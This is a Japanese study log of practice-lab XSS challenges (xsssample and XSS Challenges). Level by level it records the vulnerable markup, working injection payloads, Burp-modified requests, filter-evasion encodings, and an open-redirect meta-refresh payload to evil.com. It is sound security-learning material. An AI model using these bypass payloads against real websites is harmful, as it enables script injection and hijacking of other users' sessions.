<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [練習](#%E7%B7%B4%E7%BF%92)
  - [xsssample](#xsssample)
    - [1 (normal)](#1-normal)
    - [2 (bypass <input )](#2-bypass-input-)
    - [3 (bypass maxlength="10")](#3-bypass-maxlength10)
    - [4 (bypass "<>")](#4-bypass-)
    - [5 (bypass maxlength="10" with POST)](#5-bypass-maxlength10-with-post)
    - [6 (href javascript:)](#6-href-javascript)
    - [7 (filter "script")](#7-filter-script)
    - [8 (inject in document.write(''))](#8-inject-in-documentwrite)
    - [11 (inject \<input value="">)](#11-inject-%5Cinput-value)
    - [12 (\<meta content=""/>)](#12-%5Cmeta-content)
    - [13 (IE only)](#13-ie-only)
    - [14 (filter ?)](#14-filter-)
    - [15 (???)](#15-)
  - [XSS Challenges](#xss-challenges)
    - [1 (normal)](#1-normal-1)
    - [2 (bypass \<input value="">)](#2-bypass-%5Cinput-value)
    - [3 (inject \<select>tag)](#3-inject-%5Cselecttag)
    - [4 (bypas \<input type="hidden" value="">)](#4-bypas-%5Cinput-typehidden-value)
    - [5 (bypass maxlength="15")](#5-bypass-maxlength15)
    - [6 (fileter "<>")](#6-fileter-)
    - [7 (inject \<input value= > with no quote)](#7-inject-%5Cinput-value--with-no-quote)
    - [8 (href)](#8-href)
    - [9 (UTF-7 XSS)](#9-utf-7-xss)
    - [10 (filter "domain")](#10-filter-domain)
    - [11 ページが動いてない…](#11-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [12 IE](#12-ie)
    - [13 IE](#13-ie)
    - [14 IE](#14-ie)
    - [15 (DOM based document.write)](#15-dom-based-documentwrite)
    - [16 ページが動いてない](#16-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)
    - [17 IE](#17-ie)
    - [18 IE](#18-ie)
    - [19 ページが動いてない](#19-%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%AA%E3%81%84)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# 練習
## xsssample
http://bogus.jp/xsssample/   
writeupは以下   
https://qiita.com/gky360/items/175b8f1b4ca6f71644f4   
### 1 (normal)
http://bogus.jp/xsssample/xsssample_01.php   
![image](https://user-images.githubusercontent.com/56021519/103071017-289c1d80-4606-11eb-86d4-a051e0fdd02c.png)   
普通に`<script>alert(1);</script>`   
### 2 (bypass <input )
http://bogus.jp/xsssample/xsssample_02_M9eec.php   
![image](https://user-images.githubusercontent.com/56021519/103071081-436e9200-4606-11eb-8619-31160c8b6b82.png)   
以下のようにvalueの中に入力がセットされる。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="aaa"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
`a"><script>alert(1);</script>`

### 3 (bypass maxlength="10")
http://bogus.jp/xsssample/xsssample_03_J4Skr.php   
![image](https://user-images.githubusercontent.com/56021519/103071232-8d577800-4606-11eb-89c7-fff87f8644bc.png)   
以下のように10文字以内の制限がある。   
```txt
<form method="get" action="">login<br>
username<input name="user" maxlength="10" type="text" value=""><br>
password<input name="pass" maxlength="10" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
ブラウザからの入力が制限されているだけなので、URL上のGETパラメータの部分に`a"><script>alert(1);</script>`を書く。   
```txt
http://bogus.jp/xsssample/xsssample_03_J4Skr.php?user=a%22%3E%3Cscript%3Ealert(xss);%3C/script%3E&pass=
```
### 4 (bypass "<>")
http://bogus.jp/xsssample/xsssample_04_C_HD-.php   
![image](https://user-images.githubusercontent.com/56021519/103071499-0bb41a00-4607-11eb-8816-c28c47af61d9.png)   
`a"><script>alert(1);</script>`を入れると以下のようなる。どうやら`<>`が使えない。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="a"&gt;&lt;script&gt;alert(1);&lt;/script&gt;"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
以下でBypass。   
```txt
" onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;
" onclick="window.onerror=eval;throw'=alert\x28\x22XSS\x22\x29';
" onclick="alert(xss);
```
### 5 (bypass maxlength="10" with POST)
http://bogus.jp/xsssample/xsssample_05_3S7LA.php   
![image](https://user-images.githubusercontent.com/56021519/103071643-5d5ca480-4607-11eb-96ca-13ad9bceb4b4.png)   
10文字以内の制限があるがPOSTしてるのでBurpで書き換える。   
```txt
word=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```
### 6 (href javascript:)
http://bogus.jp/xsssample/xsssample_06_w6k2v.php   
![image](https://user-images.githubusercontent.com/56021519/103071770-a1e84000-4607-11eb-9926-f8bd7738a304.png)   
以下のように`href`属性の値に入力が入る。   
```txt
<h1><a href="aaa">link</a></h1>
```
以下でいける。   
```txt
javascript:alert('XSS!');
```
### 7 (filter "script")
http://bogus.jp/xsssample/xsssample_07_qqoXM.php   
![image](https://user-images.githubusercontent.com/56021519/103071857-d956ec80-4607-11eb-8e67-b40d9bd48ff0.png)   
<script></script>が弾かれてる   
大文字でもダメそう   
以下のように`<img`タグならいけた   
```txt
<img src="" onerror="alert('XSS!');">
```
### 8 (inject in document.write(''))
http://bogus.jp/xsssample/xsssample_08_sv8ec.php   
![image](https://user-images.githubusercontent.com/56021519/103071941-099e8b00-4608-11eb-9383-bf6b3c8c0525.png)   
以下のように入力がここに入る。なお、`"<>`は使えない。   
```txt
<script>
function hello(){
document.write ('aaa'+"さん");
}
</script>
```
以下でいける。   
```txt
');alert(xss);//
```
### 11 (inject \<input value="">)
文字数制限あり？   
`xsssample_11.php?user=aaa&pass="+onclick%3D"alert('xss')`で成功。   
### 12 (\<meta content=""/>)
`<>`が使えない   
この中に入力が入っている。   
```txt
<meta property="og:title" content="aaaa" />
```
https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308   
https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html   
https://stackoverflow.com/questions/18947139/xss-in-meta-tag   
ここにMETAタグを使ってXSSする方法がいろいろあるが、どれもうまく行ってない…ブラウザに依存してる？？   
以下のOpenRedirectだけは動作してる！
```txt
// 以下を送信
0;http://evil.com"HTTP-EQUIV="refresh"

<meta property="og:title" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
```
### 13 (IE only)
### 14 (filter ?)
いろいろ試した結果`<SCRIPT>`と大文字にすればなんらかのフィルタリングをバイパスできてる！   
```txt
<scrscriptipt>
	<scr
<scr<script>ipt>
	<scr<
<<script>ipt>
	<<
<scri<pt>ipt>
	<scri
<script<pt>ipt>
	<
<scrip<pt>ipt>
	<scrip
<SCRIPT>
	<SCRIPT>
<script>
	<script>
<script>alert(1)
	<
<script>a
	<
<SCRIPT>a
	<SCRIPT>a
<SCRIPT>alert(1)
	<SCRIPT>alert(1)
<SCRIPT>alert(1)</SCRIPT>
```
### 15 (???)
おそらく`#`以降をなんやかんやするDOM based？でもJSが特にないのでPHPでなんかやってそう…   

## XSS Challenges
https://blogs.tunelko.com/2013/12/02/xss-challenges/   
writupはここ   
### 1 (normal)
![image](https://user-images.githubusercontent.com/56021519/103072436-ea542d80-4608-11eb-94f9-09f21674c770.png)   
`<script>alert(document.domain);</script>`   
### 2 (bypass \<input value="">)
![image](https://user-images.githubusercontent.com/56021519/103072526-11aafa80-4609-11eb-84c1-5aa2f0c6dd17.png)   
`"><script>alert(document.domain);</script>`   
### 3 (inject \<select>tag)
![image](https://user-images.githubusercontent.com/56021519/103072736-8120ea00-4609-11eb-80af-8680a479fc56.png)   
`"><script>alert(document.domain);</script>`をselect countryにいれてもいけるらしい   
POSTを書き換える。   
```txt
p1=a&p2=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
![image](https://user-images.githubusercontent.com/56021519/103072714-7403fb00-4609-11eb-8e86-d7cba0dddb0e.png)   

### 4 (bypas \<input type="hidden" value="">)
![image](https://user-images.githubusercontent.com/56021519/103072902-e2e15400-4609-11eb-8d2e-27f8f22a8bef.png)   
hackmeというパラメータが送信されている。   
```txt
p1=aaa&p2=Japan&p3=hackme
```
`"><script>alert(document.domain);</script>`をhackmeの後に着けると成功！   
```txt
p1=a&p2=Japan&p3=hackme%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
```txt
</select>
<input type="hidden" name="p3" value="hackme">
<script>alert(document.domain);</script>
">
<hr class=red>
```
### 5 (bypass maxlength="15")
![image](https://user-images.githubusercontent.com/56021519/103073265-af52f980-460a-11eb-918b-b241b0f53785.png)   
以下を送信してみる。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返る。`maxlength="15"`に設定されているのでBurpから編集する。   
```txt
<form action="?sid=950789ec9535788b7bc7651d8b31bd7b63c3ecb9" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
maxlength="15" size="30" value="aaa<script>alert(document.domain);</script>"> 
<input type="submit" value="Search">
```
さっきと同じで成功！   
```txt
p1=aaa%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
### 6 (fileter "<>")
![image](https://user-images.githubusercontent.com/56021519/103073664-56379580-460b-11eb-8659-4a5f39796123.png)   
以下を送信する。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返るので、`<>`がエスケープされてる。   
```txt
<form action="?sid=222f0be5885c36dac3576a0821f5c018691232fa" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
size="50" value="aaa&lt;script&gt;alert(document.domain);&lt;/script&gt;"> <input 
type="submit" value="Search">
```
以下で成功！   
```txt
" onclick="alert(document.domain);
```
### 7 (inject \<input value= > with no quote)
![image](https://user-images.githubusercontent.com/56021519/103073917-d231dd80-460b-11eb-9dd9-76c646bfc5af.png)   
さっきと同じやつを送信してみる。   
```txt
p1=%22+onclick%3D%22alert%28document.domain%29%3B
```
`"`,`'`が使えない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=&quot; onclick=&quot;alert(document.domain);> <input type="submit" value="Search">
```
よく見ると`value=aaaa`となっていて`"`がない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=aaaaaa> <input type="submit" value="Search">
```
`hogehoge onmouseover=alert(document.domain)`のようにスペースを入れると普通に成功！   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=hogehoge onmouseover=alert(document.domain)> <input type="submit" value="Search">
```
### 8 (href)
![image](https://user-images.githubusercontent.com/56021519/103074774-a3b50200-460d-11eb-9be0-0634932f4d3d.png)   
以下のようになる。   
```txt
<hr class=red>URL: <a href="aaaa">aaaa</a><hr class=red>
```
`javascript:alert(document.domain);`で成功！   
### 9 (UTF-7 XSS)
![image](https://user-images.githubusercontent.com/56021519/103074929-f2629c00-460d-11eb-8b0a-8b8bf88063dd.png)   

```txt
p1=aaaaa&charset=euc-jpbbbbbb
```
```txt
Content-Type: text/html; charset=euc-jpbbbbbb
Content-Length: 1817

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpbbbbbb">
  
// 省略
<input type="text" name="p1" size="50" value="aaaaa">
```
`"><script>alert(document.domain);</script>`をそれぞれに送信してみると`"`がエスケープされてるぽい。   
```txt
Content-Type: text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
Content-Length: 1934

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;">
  <script language="JavaScript" type="text/javascript" charset="euc-jp" src="script.js">
```
以下のように改行をいれたHTTP Header Injectionを試す。   
```txt
aaa

<script>alert(document.domain);</script>
```
ダメっぽい…   
```txt
Content-Type: text/html; charset=UTF-8
Content-Length: 1868

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpaaa

&lt;script&gt;alert(document.domain);&lt;/script&gt;">
```
IEではcontent-typeが明示されてないと、UTF-7で書かれてると判断してXSSが可能らしい。   
UTF-7のXSSができるらしいがなんかうまく行ってない…   
```txt
p1=ffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29&charset=euc-jpffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29
```
これでIEでは`value="ffff" onmouseover="alert(document.domain)">`となっていけるはずだがなんかうまく行ってない   
IEのバージョンか？   
writeupでもうまく行かなかったって言ってる。   
```txt
Content-Type: text/html; charset=euc-jpffff+ACI- onmouseover=+ACI-alert(document.domain)

<input type="text" name="p1" size="50" value="ffff+ACI- onmouseover=+ACI-alert(document.domain)">
```
### 10 (filter "domain")
![image](https://user-images.githubusercontent.com/56021519/103078634-a7e51d80-4615-11eb-8338-6714f148dacc.png)   
さっきと同じ`"><script>alert(document.domain);</script>`を送信すると`domain`という文字がフィルタリングされている。   
```txt
No results for your Query. Try again: 
<input type="text" name="p1" size="50" value="bbb">
<script>alert(document.);</script>
"> 
```
以下で文字列を生成して、`"><script>eval(`${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}`)</script>`で`eval("alert(document.domain)")`と同じことをすると成功！   
```python
S = """alert(document.domain)"""

C = []
for s in S:
    C.append(ord(s))

print("${" + "String.fromCharCode({})".format(",".join(list(map(str, C)))) + "}")
# ${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}
```
そもそも`"><script>alert(document.domdomainain);</script>`でいけたは…   
ちなみに、`” onmouseover=alert(document.domdomainain); x=”`でマウスをinpuの中にセットすれば行けるはずだけどなんかうまく行ってない…   
![image](https://user-images.githubusercontent.com/56021519/103080190-abc66f00-4618-11eb-9472-12257140c6eb.png)   
### 11 ページが動いてない…
### 12 IE
### 13 IE
### 14 IE
### 15 (DOM based document.write)
![image](https://user-images.githubusercontent.com/56021519/103081721-d9f97e00-461b-11eb-8b77-e1cac3afe6b7.png)   
`");alert(xss);//`を入力すると`"`がエスケープされてる…      
```txt
<script>document.write("&quot;);alert(xss);//");</script>
```
DOM basedでなければ`"`をBypassする方法はない(?)が、今回はDOM basedで`document.write()`の中に入力が入るので、`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`を入力すると一見できなそうだけどXSSできる！   
これは`<script>alert(document.domain)</script>`と同じ！   
```txt
<script>
document.write("\x3cscript\x3ealert(document.domain);\x3c/script\x3e");
</script>
```
https://macchinetta.github.io/server-guideline/current/ja/Security/XSS.html   
詳細はここにある。   
### 16 ページが動いてない

### 17 IE
### 18 IE
### 19 ページが動いてない

## 動作環境ナシ
### XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3   
https://graneed.hatenablog.com/entry/2018/11/23/222842   
### katagaitaiCTF#9 xss千本ノック
http://sec-rookie.hatenablog.com/entry/2017/08/29/015957   
https://exploit.moe/2017-08-28/katagaitaiCTF9-writeup   






